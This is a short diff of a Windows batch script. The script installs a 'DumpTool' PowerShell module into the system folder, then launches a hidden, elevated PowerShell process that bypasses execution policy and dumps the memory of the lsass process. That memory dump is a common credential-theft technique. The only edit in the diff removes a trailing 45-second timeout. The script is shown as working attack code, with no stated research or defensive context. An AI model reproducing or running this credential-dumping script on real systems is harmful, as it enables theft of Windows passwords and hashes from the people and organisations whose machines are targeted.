@@ -14,5 +14,5 @@ XCOPY /Y /S /I "%~dp0\z0b0tSoftware\DumpTool" "C:\Windows\System32\WindowsPowerS
 
 :: Bypass the execution policy to dump the memory
 :: NOTE: The memory dump will by default (unless manually configured here) be located at C:\Windows\System32
-PowerShell.exe -WindowStyle Hidden -NonInteractive -NoLogo -NoProfile -Command "& {Start-Process PowerShell -ArgumentList 'Set-ExecutionPolicy Unrestricted -Force; Get-Module DumpTool | Import-Module; Import-Module DumpTool; Get-Process lsass | DumpTool; Set-ExecutionPolicy Restricted -Force; timeout 45' -Verb RunAs}"
+PowerShell.exe -WindowStyle Hidden -NonInteractive -NoLogo -NoProfile -Command "& {Start-Process PowerShell -ArgumentList 'Set-ExecutionPolicy Unrestricted -Force; Get-Module DumpTool | Import-Module; Import-Module DumpTool; Get-Process lsass | DumpTool; Set-ExecutionPolicy Restricted -Force' -Verb RunAs}"
 
